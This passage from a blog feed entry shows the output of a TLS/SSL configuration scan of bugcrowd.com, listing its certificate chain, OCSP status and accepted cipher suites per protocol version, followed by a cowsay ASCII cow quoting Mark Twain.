</span><span class='line'>      Certificate Chain Received:        ['bugcrowd.com', 'DigiCert SHA2 Extended Validation Server CA']
</span><span class='line'>
</span><span class='line'>  * Certificate - OCSP Stapling:
</span><span class='line'>      OCSP Response Status:              successful
</span><span class='line'>      Validation w/ Mozilla's CA Store:  OK - Response is trusted
</span><span class='line'>      Responder Id:                      3DD350A5D6A0ADEEF34A600A65D321D4F8F8D60F
</span><span class='line'>      Cert Status:                       good
</span><span class='line'>      Cert Serial Number:                075FE475034104F4909DDD4B5CD8C1AC
</span><span class='line'>      This Update:                       Jul 12 12:10:00 2017 GMT
</span><span class='line'>      Next Update:                       Jul 19 11:25:00 2017 GMT
</span><span class='line'>
</span><span class='line'>  * TLSV1_2 Cipher Suites:
</span><span class='line'>      Preferred:                       
</span><span class='line'>                 ECDHE-RSA-AES128-GCM-SHA256   ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>      Accepted:                        
</span><span class='line'>                 ECDHE-RSA-AES256-SHA384       ECDH-256 bits  256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES256-GCM-SHA384   ECDH-256 bits  256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES256-SHA256                 -              256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES256-SHA                    -              256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES256-GCM-SHA384             -              256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES128-SHA256       ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES128-GCM-SHA256   ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES128-SHA256                 -              128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES128-SHA                    -              128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES128-GCM-SHA256             -              128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>
</span><span class='line'>  * TLSV1_1 Cipher Suites:
</span><span class='line'>      Preferred:                       
</span><span class='line'>                 ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>      Accepted:                        
</span><span class='line'>                 ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES256-SHA                    -              256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES128-SHA                    -              128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>
</span><span class='line'>  * TLSV1 Cipher Suites:
</span><span class='line'>      Preferred:                       
</span><span class='line'>                 ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>      Accepted:                        
</span><span class='line'>                 ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES256-SHA                    -              256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES128-SHA                    -              128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 DES-CBC3-SHA                  -              112 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>
</span><span class='line'>  * SSLV3 Cipher Suites:
</span><span class='line'>      Server rejected all cipher suites.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> SCAN COMPLETED IN 1.71 S
</span><span class='line'> ------------------------</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Noise proves nothing. Often a hen who \
</span><span class='line'>| has merely laid an egg cackles as if  |
</span><span class='line'>| she laid an asteroid.                 |
</span><span class='line'>|                                       |
</span><span class='line'>\ -- Mark Twain                         /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
</feed>
